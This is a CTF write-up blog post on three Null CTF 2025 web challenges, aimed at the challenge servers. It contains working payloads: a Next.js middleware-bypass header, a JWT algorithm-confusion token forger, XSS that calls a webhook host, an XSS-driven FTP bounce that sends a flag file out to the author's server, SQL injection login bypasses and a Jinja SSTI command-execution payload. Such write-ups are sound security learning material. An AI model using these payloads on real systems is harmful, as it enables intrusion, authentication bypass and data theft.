<!DOCTYPE html>
<html lang="en">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Null CTF 2025: Web Challenges · CTF Writeups</title>
  <meta name="description" content="Notes from the Null CTF 2025 web challenges covering Next Jason&rsquo;s auth bypass and JWT abuse." />
  <link rel="stylesheet" href="/css/main.css" />
</head>

<body>
  <header class="site-header">
    <div class="container header-inner">
      <a class="logo" href="/">CTF Writeups</a>
      <nav>
        <ul class="nav-list">
          <li><a href="/posts/">Posts</a></li>
          <li><a href="/tags/">Tags</a></li>
        </ul>
      </nav>
    </div>
  </header>
  <main class="container">
    
<article class="post-single">
  <header class="post-header">
    <p class="meta">12 Dec 2025 • 6 min read</p>
    <h1>Null CTF 2025: Web Challenges</h1>
    <p class="lead">Notes from the Null CTF 2025 web challenges covering Next Jason&#39;s auth bypass and JWT abuse.</p>
  </header>

  <div class="post-content">
    <h1 id="intro">Intro</h1>
<p>I participated in this CTF with <a href="https://ctftime.org/team/373454"><strong>PulsaDeCyber</strong></a>. Unfortunately I was busy most of the time, so I only had time to solve 3 challenges, that were easy-medium.</p>
<h1 id="challenge-next-jason---easy">Challenge: <code>Next Jason</code> - Easy</h1>
<h2 id="analysis">Analysis</h2>
<p>By opening the source code, I immediately booted up the docker container, so I can play with stuff locally without too much infrastructure-stuff going on.
First thing I realized is there is a <code>next.js</code> app that is using some middleware, specified for all <code>/api/*</code>. By going into the website we get a regular login page:</p>
<p><img src="/assets/Pasted%20image%2020251207003729.png" alt="Login page"></p>
<p>After checking the installed <code>next.js</code> version, I verified <a href="https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass"># CVE-2025-29927</a> in the given code.</p>
<p>The simple bypass for the middleware will be adding the next header to our /api/* requests:
<code>x-middleware-subrequest: &quot;middleware:middleware:middleware:middleware:middleware&quot;</code></p>
<p>Let&rsquo;s look at <code>package.json</code>:
<img src="/assets/Pasted%20image%2020251207004411.png" alt="package.json dependencies"></p>
<p>Both <code>next.js</code> and <code>jsonwebtoken</code> libraries are out of version.
The catch is to look for an easy <code>jwt</code> misconfiguration.</p>
<p>Let&rsquo;s look at the code!</p>
<p><code>/token/verify</code>
<img src="/assets/Pasted%20image%2020251207005819.png" alt="verifyToken route snippet">
I wont show the whole route, but the main function is <code>verifyToken</code>, which returns the payload for the token if it is valid, by decrypting it using the public key of a randomly generated RSA.
It uses both <code>RS256</code> and <code>HS256</code> to verify, which is weird. But let&rsquo;s continue!</p>
<p><code>/token/sign</code>
<img src="/assets/Pasted%20image%2020251207010126.png" alt="token signing route">
Well, all this code does is to sign the given payload ( which here is basically <code>{username: string}</code> ) to a <code>jwt</code> token. Also, we cannot sign as admin, so we can&rsquo;t get the admin&rsquo;s token.</p>
<p>We have a few more routes in the <code>api</code>, which will be used after the middleware bypass:</p>
<ul>
<li><code>/api/getFlag</code> - returns flag after running <code>/token/verify</code> and checks if we are admin (not usable for now)</li>
<li><code>/api/getPublicKey</code> - returns the RSA&rsquo;s private key. Great achievement.</li>
<li><code>/api/login</code> - just generates a <code>jwt</code> token using <code>/token/sign</code> and filters us from being admin, not usable at all.</li>
</ul>
<p>We can achieve the public key! that&rsquo;s great news.
As I was looking for <code>jwt</code> vulnerabilities, I found this <a href="https://www.vaadata.com/blog/jwt-json-web-token-vulnerabilities-common-attacks-and-security-best-practices/#algorithm-confusion">article</a>. At the exact &ldquo;Algorithm Confusion&rdquo; title, we can see a case we have in this code.
We first sign the payload using RS256, and we verify it with both HS256 or RS256.</p>
<p>The way they exploit this in the article is by signing the token using HS256, and the public key as the secret, and it works!</p>
<p>So, let&rsquo;s try!</p>
<h2 id="exploit">Exploit</h2>
<p>After fetching the public key, I wrote this js code to generate a new token</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff7b72">const</span> jwt <span style="color:#ff7b72;font-weight:bold">=</span> require(<span style="color:#a5d6ff">&#34;jsonwebtoken&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff7b72">const</span> {readFileSync} <span style="color:#ff7b72;font-weight:bold">=</span> require(<span style="color:#a5d6ff">&#34;fs&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff7b72">const</span> path <span style="color:#ff7b72;font-weight:bold">=</span> require(<span style="color:#a5d6ff">&#34;path&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff7b72">const</span> PUBKEY <span style="color:#ff7b72;font-weight:bold">=</span> require(<span style="color:#a5d6ff">&#34;./pubkey.json&#34;</span>).PUBKEY;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72">const</span> payload <span style="color:#ff7b72;font-weight:bold">=</span> {
</span></span><span style="display:flex;"><span>username<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">&#39;admin&#39;</span>
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72">const</span> token <span style="color:#ff7b72;font-weight:bold">=</span> jwt.sign(payload, PUBKEY, { algorithm<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">&#39;HS256&#39;</span>})
</span></span><span style="display:flex;"><span>console.log(token); <span style="color:#8b949e;font-style:italic">// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzY0OTUzMDk1fQ.4pG_xYmHYcKNSBIplBKlLQ0eNL-fi0Yp3Fb6kwXI6sw
</span></span></span></code></pre></div><p>Next, I wrote a simple python script that will fetch the flag using the new admin token, and the middleware bypass:</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>r <span style="color:#ff7b72;font-weight:bold">=</span> requests<span style="color:#ff7b72;font-weight:bold">.</span>get(<span style="color:#a5d6ff">&#39;http://75cb8a82a9d8.challs.ctf.r0devnull.team:8001/api/getFlag&#39;</span>, headers<span style="color:#ff7b72;font-weight:bold">=</span>{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#34;x-middleware-subrequest&#34;</span>: <span style="color:#a5d6ff">&#34;middleware:middleware:middleware:middleware:middleware&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}, cookies<span style="color:#ff7b72;font-weight:bold">=</span>{
</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;token&#39;</span>: <span style="color:#a5d6ff">&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzY0OTUzMDk1fQ.4pG_xYmHYcKNSBIplBKlLQ0eNL-fi0Yp3Fb6kwXI6sw&#39;</span>
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(r<span style="color:#ff7b72;font-weight:bold">.</span>text)
</span></span></code></pre></div><h4 id="flag-nullctff0rg3_7h15_cv3_h3h_c1caa1a23b5c568d">Flag: <code>nullctf{f0rg3_7h15_cv3_h3h_c1caa1a23b5c568d}</code></h4>
<h1 id="challenge-ftp-db---medium">Challenge: <code>ftp-db</code> - Medium</h1>
<h2 id="analysis-1">Analysis</h2>
<p>This challenge has 3 services.</p>
<ul>
<li>Frontend - <code>next.js</code>, nothing special. A note from the authors mentioned there is nothing special in the frontend. Contacts the backend by using a server component in <code>next.js</code>.</li>
<li>FTP (file transfer protocol) - initializes an FTP server using python&rsquo;s <code>pyftpdlib</code>.
Note: enables <code>permit_foreign_addresses</code> which allows us to use active mode to send data streams. through a foreign server ( will explain later :) ) .</li>
<li>Backend - <code>rust &amp; rocket</code>, contacts the ftp server.</li>
</ul>
<p>So we cannot send requests to ftp or backend, since they are both locally on the container, no open ports.</p>
<p>Let&rsquo;s open the app:</p>
<p><img src="/assets/Pasted%20image%2020251207120355.png" alt="Notes app homepage"></p>
<p>This is a classic notes app. Backend stores notes in the FTP server.
Let&rsquo;s check the code.</p>
<p><img src="/assets/Pasted%20image%2020251207120552.png" alt="Note creation code"></p>
<p>nothing really special for creating a note, I wanna look at the code for the search page.</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-tsx" data-lang="tsx"><span style="display:flex;"><span>&lt;<span style="color:#7ee787">div</span>
</span></span><span style="display:flex;"><span>	className<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;font-mono w-full p-2 text-sm bg-green-900 rounded border border-green-800&#34;</span>
</span></span><span style="display:flex;"><span>	dangerouslySetInnerHTML<span style="color:#ff7b72;font-weight:bold">=</span>{{
</span></span><span style="display:flex;"><span>		__html: <span style="color:#ff7b72">searchResult.result</span>,
</span></span><span style="display:flex;"><span>	}}
</span></span><span style="display:flex;"><span>/&gt;
</span></span></code></pre></div><p>We can see the search page injects the page&rsquo;s HTML with the note&rsquo;s content. This is an XSS.</p>
<p>We also have a &ldquo;Report to admin&rdquo; button, which opens a webdriver on a specific note, this can trigger the admin to enter our custom note and get injected by our payload.</p>
<p>Let&rsquo;s validate our theory by making the admin send a message to my webhook:</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#7ee787">img</span> src<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">x</span> onerror<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;(()=&gt;{fetch(&#34;https://webhook.site/9fe988d0-b53c-451d-9dd5-1febc0179031&#34;, {method: &#34;POST&#34;, mode: &#34;no-cors&#34;}).then((r) =&gt; r.text())})()&#39;</span>&gt;
</span></span></code></pre></div><p><img src="/assets/Pasted%20image%2020251207121713.png" alt="Webhook hit screenshot"></p>
<p>Next step was to figure out how can I actually inject an XSS that will lead us to get flag.txt from the ftp server.</p>
<p>It was quite exhausting, but after asking some advice, my friend <a href="https://x.com/H4R3L"><strong>Harel</strong></a> told me about <strong>FTP Bounce Attack</strong>, that allows us to make the ftp server connect via <strong>active mode</strong> to a foreign machine, and send the requested data there.</p>
<h2 id="exploit-1">Exploit</h2>
<p>To actually use this attack, I found a way to manipulate the CRLF by just sending a raw string body using a POST request, so the body will be in the bottom of the request, and not in the URL header. Locally, I tried the next thing:</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#7ee787">img</span> src<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">x</span> onerror<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;(()=&gt;{fetch(&#34;http://ftp:2121&#34;, {method: &#34;POST&#34;, body:&#34;USER anonymous\r\nPASS anonymous\r\n&#34;, mode: &#34;no-cors&#34;})})()&#39;</span>&gt;
</span></span></code></pre></div><p>by seeing the FTP logs. It actually worked. The admin opened a connection to the ftp server, sent him some unknown commands (the HTTP headers lol), and sent him the body, that was injected with FTP commands.</p>
<p>I booted up a proxy server with a script I wrote (<a href="https://github.com/nitayStain/ftp-bounce-listener/blob/main/main.py">Check it out</a>). And tried the next payload on the original website:</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#7ee787">img</span> src<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">x</span> onerror<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;(()=&gt;{fetch(&#34;http://ftp:2121&#34;, {method: &#34;POST&#34;, body:&#34;USER anonymous\r\nPASS anonymous\r\nTYPE A\r\nPORT &lt;ip,port&gt;\r\nRETR flag.txt\r\n&#34;})})()&#39;</span>&gt;
</span></span></code></pre></div><p>But I didn&rsquo;t get any connection to my proxy server.</p>
<p>After figuring it out for a while, I tried adding <code>no-cors</code> and waiting for the promise to finish (using .then).</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#7ee787">img</span> src<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">x</span> onerror<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;(()=&gt;{fetch(&#34;http://ftp:2121&#34;, {method: &#34;POST&#34;, body:&#34;USER anonymous\r\nPASS anonymous\r\nTYPE A\r\nPORT &lt;ip,port&gt;\r\nRETR flag.txt\r\n&#34;, mode: &#34;no-cors&#34;}).then((r) =&gt; r.text())})()&#39;</span>&gt;
</span></span></code></pre></div><p>And it worked!</p>
<h4 id="flag-nullctfftp_15_7h3_b357_d474b453">Flag: <code>nullctf{ftp_15_7h3_b357_d474b453}</code></h4>
<h2 id="credits">Credits:</h2>
<ul>
<li><a href="https://thomy-g.github.io/">Thomas Goldman</a> - we solved this challenge together as teammates.</li>
</ul>
<h1 id="challenge-s1mple---easy">Challenge: <code>s1mple</code> - Easy</h1>
<h2 id="analysis-2">Analysis</h2>
<p>There was no source code for this challenge, although the solution was pretty easy.</p>
<p><img src="/assets/Pasted%20image%2020251207125647.png" alt="Admin login page"></p>
<p>First is this admin page, after trying basic SQLI payload (<code>' OR 1=1;--</code>), I was logged in as admin.</p>
<p><img src="/assets/Pasted%20image%2020251207125739.png" alt="Dashboard view"></p>
<p>We are given this dashboard, which isn&rsquo;t really helpful since you cannot really do anything here. I tried writing an SQLI payload on the search, which didn&rsquo;t work. And later on I tried SSTI, nothing worked.</p>
<p>So I tried logging in as a different user: <code>' OR 1=1 AND USERNAME != 'admin';--</code></p>
<p><img src="/assets/Pasted%20image%2020251207125907.png" alt="User view"></p>
<p>we are logged in as user!</p>
<p>Let&rsquo;s try an SQLI query:</p>
<p><img src="/assets/Pasted%20image%2020251207125929.png" alt="SQL injection attempt"></p>
<p>Okay, let&rsquo;s try a basic SSTI:</p>
<p><img src="/assets/Pasted%20image%2020251207130000.png" alt="SSTI payload"></p>
<p>Perfect.</p>
<p>now let&rsquo;s try to read a file:</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{request[<span style="color:#a5d6ff">&#39;application&#39;</span>][<span style="color:#a5d6ff">&#39;__globals__&#39;</span>][<span style="color:#a5d6ff">&#39;__builtins__&#39;</span>][<span style="color:#a5d6ff">&#39;__import__&#39;</span>](<span style="color:#a5d6ff">&#39;os&#39;</span>)[<span style="color:#a5d6ff">&#39;popen&#39;</span>](<span style="color:#a5d6ff">&#39;cat flag.txt&#39;</span>)[<span style="color:#a5d6ff">&#39;read&#39;</span>]()}}
</span></span></code></pre></div><p><img src="/assets/Pasted%20image%2020251207130046.png" alt="Flag output"></p>
<p>It was really simple!</p>
<h4 id="flag-nullctf1nd33d_1t_w4s_th4t_s1mpl3">Flag: <code>nullctf{1nd33d_1t_w4s_th4t_s1mpl3}</code></h4>

  </div>

  <footer class="post-footer">
    <div class="meta-group">
      <span>Tags:</span>
      <ul class="tag-list">
        <li><a href="/tags/ctf/">#ctf</a></li>
        <li><a href="/tags/web/">#web</a></li>
      </ul>
    </div>
    <nav class="post-nav">
      <a class="next" href="/posts/patriot-ctf-2025-web-challenges/">Patriot CTF 2025: Web Challenges →</a>
    </nav>
  </footer>
</article>

  </main>
  <footer class="site-footer">
    <div class="container footer-inner">
      <p>© 2025 Nitay · Built with Hugo</p>
    </div>
  </footer>
</body>

</html>
